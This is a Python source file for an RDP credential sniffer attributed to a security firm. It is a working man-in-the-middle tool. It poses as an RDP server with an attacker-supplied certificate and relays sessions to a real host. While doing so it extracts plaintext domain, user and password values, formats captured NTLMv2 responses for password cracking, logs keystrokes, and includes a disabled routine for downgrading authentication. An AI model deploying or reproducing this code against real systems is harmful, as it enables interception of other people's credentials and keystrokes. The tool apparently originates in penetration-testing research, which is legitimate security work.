#!/usr/bin/env python3
"""
RDP Credential Sniffer
Adrian Vollmer, SySS GmbH 2017
"""

import argparse
import socket
import ssl
import binascii
import re
from hexdump import hexdump
import select
import struct
import time


parser = argparse.ArgumentParser(
    description="RDP credential sniffer -- Adrian Vollmer, SySS GmbH 2017")
parser.add_argument('-d', '--debug', dest='debug', action="store_true",
        default=False, help="show debug information")
parser.add_argument('-p', '--listen-port', dest='listen_port', type=int,
    default=3389, help="TCP port to listen on (default 3389)")
parser.add_argument('-b', '--bind-ip', dest='bind_ip', type=str, default="",
    help="IP address to bind the fake service to (default all)")
parser.add_argument('-c', '--certfile', dest='certfile', type=str,
    required=True, help="path to the certificate file")
parser.add_argument('-k', '--keyfile', dest='keyfile', type=str,
    required=True, help="path to the key file")
parser.add_argument('target_host', type=str,
    help="target host of the RDP service")
parser.add_argument('target_port', type=int, default=3389, nargs='?',
    help="TCP port of the target RDP service (default 3389)")

args = parser.parse_args()


def extract_ntlmv2(bytes):
    # References:
    #  - [MS-NLMP].pdf
    #  - https://www.root9b.com/sites/default/files/whitepapers/R9B_blog_003_whitepaper_01.pdf
    offset = len(m.group())//2
    fields = [bytes[offset+i*8:offset+(i+1)*8] for i in range(6)]
    field_offsets = [struct.unpack('<I', x[4:])[0] for x in fields]
    field_lens = [struct.unpack('<H', x[:2])[0] for x in fields]
    payload = bytes[offset+76:]

    keys = ["lmstruct", "ntstruct", "domain", "user", "workstation",
            "encryption_key"]
    values = {}
    for i,length in enumerate(field_lens):
        thisoffset = offset - 12 + field_offsets[i]
        values[keys[i]] = bytes[thisoffset:thisoffset+length]

    # TODO check if LM struct is more than just zeros

    nt_response = values["ntstruct"][:16]
    jtr_string = values["ntstruct"][16:]

    if not 'server_challenge' in globals():
        server_challenge = b"SERVER_CHALLENGE_MISSING"

    return (b"%s::%s:%s:%s:%s" % (
                 values["user"],
                 values["domain"],
                 binascii.hexlify(server_challenge),
                 binascii.hexlify(nt_response),
                 binascii.hexlify(jtr_string),
         )).decode()


def parse_rdp(bytes):
#  00000000: 03 00 01 71 02 F0 80 64  00 08 03 EB 70 81 62 40  ...q...d....p.b@
#  00000010: 00 00 00 07 04 07 04 BB  47 01 00 08 00 0A 00 12  ........G.......
#  00000020: 00 00 00 00 00 52 00 44  00 31 00 34 00 00 00 55  .....R.D.1.4...U
#  00000030: 00 73 00 65 00 72 00 31  00 00 00 50 00 61 00 73  .s.e.r.1...P.a.s
#  00000040: 00 73 00 77 00 6F 00 72  00 74 00 31 00 00 00 00  .s.w.o.r.t.1....
#
#  00000000: 03 00 01 7D 02 F0 80 64  00 08 03 EB 70 81 6E 40  ...}...d....p.n@
#  00000010: 00 00 00 00 00 00 00 3B  01 00 00 08 00 12 00 24  .......;.......$
#  00000020: 00 00 00 00 00 72 00 64  00 31 00 34 00 00 00 44  .....r.d.1.4...D
#  00000030: 00 6F 00 6D 00 41 00 64  00 6D 00 69 00 6E 00 31  .o.m.A.d.m.i.n.1
#  00000040: 00 00 00 44 00 6F 00 6D  00 41 00 64 00 6D 00 69  ...D.o.m.A.d.m.i
#  00000050: 00 6E 00 2D 00 50 00 61  00 73 00 73 00 77 00 6F  .n.-.P.a.s.s.w.o
#  00000060: 00 72 00 74 00 31 00 00  00 00 00 00 00 02 00 18  .r.t.1..........
#
#  00000000: 03 00 01 53 02 F0 80 64  00 07 03 EB 70 81 44 40  ...S...d....p.D@
#  00000010: 00 00 00 00 00 00 00 3B  01 00 00 08 00 08 00 08  .......;........
#  00000020: 00 00 00 00 00 74 00 65  00 73 00 74 00 00 00 74  .....t.e.s.t...t
#  00000030: 00 65 00 73 00 74 00 00  00 74 00 65 00 73 00 74  .e.s.t...t.e.s.t
#  00000040: 00 00 00 00 00 00 00 02  00 14 00 31 00 32 00 37  ...........1.2.7
    # hexlify first because \x0a is a line break and regex works on single
    # lines

    cred_regex = b".{16}00..03eb.{6}40.{20}(.{4})(.{4})(.{4})"
    m = re.match(cred_regex, binascii.hexlify(bytes))
    if m:
        domlen, userlen, pwlen = [
            struct.unpack('>H',
                          binascii.unhexlify(x)
                         )[0]
            for x in m.groups()
        ]
        offset = 36
        domain = bytes[offset:offset+domlen]
        user = bytes[offset+domlen+2:offset+domlen+2+userlen]
        pw = bytes[offset+domlen+2+userlen+2:offset+domlen+2+userlen+2+pwlen]
        print((b"%s\\%s:%s" % (domain, user, pw)).decode())
        close();exit(0)
        return True

    cred_regex = b".*%s0002000000" % binascii.hexlify(b"NTLMSSP")
    m = re.match(cred_regex, binascii.hexlify(bytes))
    if m:
        offset = len(m.group())//2+12
        global server_challenge
        server_challenge = bytes[offset:offset+8]
        print("Server challenge: " + binascii.hexlify(server_challenge).decode())

    cred_regex = b".*%s0003000000" % binascii.hexlify(b"NTLMSSP")
    m = re.match(cred_regex, binascii.hexlify(bytes))
    if m:
        print(extract_ntlmv2(bytes))


    keypress_regex = b"\x03\x00\x001"
    m = re.match(keypress_regex, bytes)
    if m:
        event = bytes[-5]
        key = bytes[-4] # TODO map scancode to ascii
        if event == 0:
            print("Key press:   %d" % key)
        elif event == 192:
            print("Key release: %d" % key)
        return True
    keymap_regex = b".*en-us.*" # TODO find keymap definition
    m = re.match(keymap_regex, bytes)
    if m:
        print(b"Keymap: " + bytes)
    return False

#  with open("bytes", 'rb') as f:
#      bytes = f.read()
#  parse_rdp(bytes)
#  exit(1)

def downgrade_auth(bytes):
    cred_regex = b".*..00..00.{8}$"
    m = re.match(cred_regex, binascii.hexlify(bytes))
    new_value = 3
    if m and not bytes[-4] == new_value:
        print("Downgrading authentication options:")
        result = bytes[:-4] + chr(new_value).encode() + b"\x00\x00\x00"
        dump_data(result, From="Client")
        return result
    return bytes


def dump_data(data, From=None):
    if args.debug:
        if From == "Server":
            print("From server:")
        elif From == "Client":
            print("From client:")

        hexdump(data)



def handle_cleartext():
    data = local_conn.recv(4096)
    dump_data(data, From="Client")
    #  data = downgrade_auth(data)
    remote_socket.send(data)

    data = remote_socket.recv(4096)
    dump_data(data, From="Server")
    local_conn.send(data)


def enableSSL():
    global local_conn
    global remote_socket
    print("Enable SSL")
    local_conn  = ssl.wrap_socket(
        local_conn,
        server_side=True,
        keyfile=args.keyfile,
        certfile=args.certfile,
    )
    remote_socket = ssl.wrap_socket(remote_socket)


def close():
    local_conn.close()
    remote_socket.close()
    return False


def forward_data():
    readable, _, _ = select.select([local_conn, remote_socket], [], [])
    for s_in in readable:
        if s_in == local_conn:
            data = s_in.recv(4096)
            if len(data)==4096:
                while len(data)%4096 == 0:
                    data += s_in.recv(4096)
            if data == b"": return close()
            dump_data(data, From="Client")
            parse_rdp(data)
            remote_socket.send(data)
        elif s_in == remote_socket:
            data = s_in.recv(4096)
            if len(data)==4096:
                while len(data)%4096 == 0:
                    data += s_in.recv(4096)
            if data == b"": return close()
            dump_data(data, From="Server")
            parse_rdp(data)
            local_conn.send(data)
    return True


def original_dest(s):
    SO_ORIGINAL_DEST = 80
    sockaddr_in = s.getsockopt(socket.SOL_IP, SO_ORIGINAL_DEST, 16)
    (proto, port, a, b, c, d) = struct.unpack('!HHBBBB', sockaddr_in[:8])
    return "%d.%d.%d.%d:%d" % (a, b, c, d, port)

def open_sockets():
    global local_conn
    global remote_socket
    print("Waiting for connection")
    local_conn, addr = local_socket.accept()
    print("Connection received from " + addr[0])

    #  print(original_dest(local_conn))

    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    remote_socket.connect((args.target_host, args.target_port))


def run():
    open_sockets()
    handle_cleartext()
    enableSSL()
    while True:
        try:
            if not forward_data():
                break
        except ssl.SSLError as e :
            print("SSLError: %s" % str(e))


local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local_socket.bind((args.bind_ip, args.listen_port))
local_socket.listen()

try:
    while True:
        run()
except KeyboardInterrupt:
    time.sleep(.2)
except Exception as e:
    print(str(e))
finally:
    local_socket.close()
    close()
